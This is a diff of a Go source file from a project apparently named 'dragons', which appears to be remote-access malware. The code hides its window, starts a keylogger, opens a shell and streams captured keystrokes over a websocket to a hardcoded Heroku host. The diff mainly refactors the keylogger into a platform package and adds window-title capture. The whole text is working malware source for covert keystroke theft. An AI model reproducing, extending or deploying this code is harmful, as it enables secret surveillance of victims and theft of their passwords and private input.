@@ -18,10 +18,9 @@ import (
 
 	"github.com/d0minikt/dragons/lib"
 	"github.com/d0minikt/dragons/target/gather"
-	"github.com/d0minikt/dragons/target/keylogger"
+	"github.com/d0minikt/dragons/target/platform"
 )
 
-var addr = flag.String("addr", "dragons-land.herokuapp.com", "http service address")
 var debug = false
 
 var (
@@ -44,8 +43,10 @@ func HideWindow() {
 
 func main() {
 	flag.BoolVar(&debug, "debug", false, "Debug mode")
+	addr := "dragons-land.herokuapp.com"
 	if !debug {
 		HideWindow()
+		addr = "0.0.0.0"
 	}
 
 	flag.Parse()
@@ -60,13 +61,13 @@ func main() {
 	defer shell.Exit()
 
 	// keylogger
-	keypressed := make(chan keylogger.KeylogFunc)
-	go keylogger.StartKeylogger(keypressed)
+	keypressed := make(chan platform.KeylogFunc)
+	go platform.StartKeylogger(keypressed)
 
 	// init websocket
 	interrupt := make(chan os.Signal, 1)
 	signal.Notify(interrupt, os.Interrupt)
-	u := url.URL{Scheme: "ws", Host: *addr, Path: "/ws"}
+	u := url.URL{Scheme: "ws", Host: addr, Path: "/ws"}
 	log.Printf("connecting to %s", u.String())
 	ws, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
 	if err != nil {
@@ -164,8 +165,8 @@ func main() {
 				}
 			} else {
 				keylog = append(keylog, "["+key+"]", "")
-
 			}
+			println(platform.GetCurrentWindow())
 		case <-done:
 			return
 		// send data periodically
